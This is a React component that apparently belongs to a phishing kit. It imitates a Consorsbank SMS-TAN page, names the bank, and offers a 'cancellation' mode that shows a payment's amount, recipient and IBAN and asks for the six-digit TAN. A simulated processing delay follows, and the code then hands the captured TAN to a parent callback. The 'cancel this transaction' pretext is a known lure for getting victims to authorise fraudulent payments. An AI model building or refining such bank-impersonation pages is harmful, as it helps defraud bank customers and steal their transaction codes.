import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
      />
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
      color: '#000000',
      WebkitFontSmoothing: 'antialiased',
      fontFeatureSettings: '"ss05" 1'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px 60px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main SMS TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          border: '1px solid #d1d1d1',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Header Section */}
          <div style={{
            backgroundColor: '#f5f5f5',
            padding: isMobile ? '20px' : '30px',
            borderBottom: '1px solid #d1d1d1'
          }}>
            <h1 style={{
              color: '#0080a6',
              fontSize: isMobile ? '1.75rem' : '2.5rem',
              fontWeight: '650',
              margin: '0',
              fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
              textAlign: 'center',
              lineHeight: '120%'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #d1d1d1',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#000000',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                lineHeight: '140%'
              }}>
                {tanType === 'TRANSACTION_TAN'
                  ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                  : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #0080a6',
                borderRadius: '4px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#0080a6',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '650',
                  margin: '0 0 20px 0',
                  fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                  textAlign: 'center',
                  lineHeight: '120%'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #d1d1d1'
                  }}>
                    <span style={{
                      color: '#464646',
                      fontSize: '14px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      fontWeight: '400'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#0080a6',
                      fontSize: '18px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      fontWeight: '650'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d1d1'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d1d1'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAN Input Section */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #d1d1d1',
              borderRadius: '4px',
              padding: '30px',
              marginBottom: '30px'
            }}>
              <h3 style={{
                color: '#0080a6',
                fontSize: isMobile ? '1.125rem' : '1.25rem',
                fontWeight: '650',
                margin: '0 0 25px 0',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                textAlign: 'center',
                lineHeight: '120%'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
              </h3>

              {/* TAN Input Fields */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                gap: isMobile ? '8px' : '12px',
                marginBottom: '25px',
                flexWrap: 'wrap'
              }}>
                {tan.map((digit, index) => (
                  <input
                    key={index}
                    id={`tan-input-${index}`}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    style={{
                      width: isMobile ? '40px' : '50px',
                      height: isMobile ? '50px' : '60px',
                      fontSize: isMobile ? '1.5rem' : '1.75rem',
                      textAlign: 'center',
                      border: '1px solid #d1d1d1',
                      borderRadius: '4px',
                      outline: 'none',
                      color: '#0080a6',
                      fontWeight: '500',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      backgroundColor: '#ffffff',
                      transition: 'border-color 0.2s ease'
                    }}
                    onFocus={(e) => {
                      (e.target as HTMLInputElement).style.borderColor = '#0080a6';
                    }}
                    onBlur={(e) => {
                      (e.target as HTMLInputElement).style.borderColor = '#d1d1d1';
                    }}
                    disabled={isSubmitting}
                  />
                ))}
              </div>

              {/* Submit Button */}
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleSubmit}
                  disabled={tan.join('').length !== 6 || isSubmitting}
                  style={{
                    backgroundColor: (tan.join('').length !== 6 || isSubmitting) ? '#d1d1d1' : '#0080a6',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '14px 28px',
                    fontSize: '16px',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    fontWeight: '500',
                    cursor: (tan.join('').length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                    transition: 'background-color 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '200px',
                    lineHeight: '140%'
                  }}
                  onMouseEnter={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#05a9c3';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#0080a6';
                    }
                  }}
                >
                  {isSubmitting
                    ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                    : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                  }
                </button>
              </div>

              {/* Resend Button */}
              {onResend && (
                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                  <button
                    onClick={handleResend}
                    disabled={!canResend || isSubmitting}
                    style={{
                      backgroundColor: 'transparent',
                      color: (!canResend || isSubmitting) ? '#d1d1d1' : '#0080a6',
                      border: `2px solid ${(!canResend || isSubmitting) ? '#d1d1d1' : '#0080a6'}`,
                      borderRadius: '4px',
                      padding: '12px 26px',
                      fontSize: '16px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      fontWeight: '500',
                      cursor: (!canResend || isSubmitting) ? 'not-allowed' : 'pointer',
                      transition: 'all 0.2s ease',
                      width: isMobile ? '100%' : 'auto',
                      minWidth: '200px',
                      lineHeight: '140%'
                    }}
                    onMouseEnter={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = '#0080a6';
                        (e.target as HTMLButtonElement).style.color = '#ffffff';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                        (e.target as HTMLButtonElement).style.color = '#0080a6';
                      }
                    }}
                  >
                    TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                  </button>
                </div>
              )}

              {/* Cancel Link */}
              {onCancel && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      onCancel();
                    }}
                    style={{
                      color: '#0080a6',
                      textDecoration: 'none',
                      fontSize: '14px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      transition: 'color 0.2s ease',
                      lineHeight: '140%'
                    }}
                    onMouseEnter={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#05a9c3';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'underline';
                    }}
                    onMouseLeave={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#0080a6';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'none';
                    }}
                  >
                    {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                  </a>
                </div>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#464646',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                lineHeight: '140%'
              }}>
                Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie den Consorsbank Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
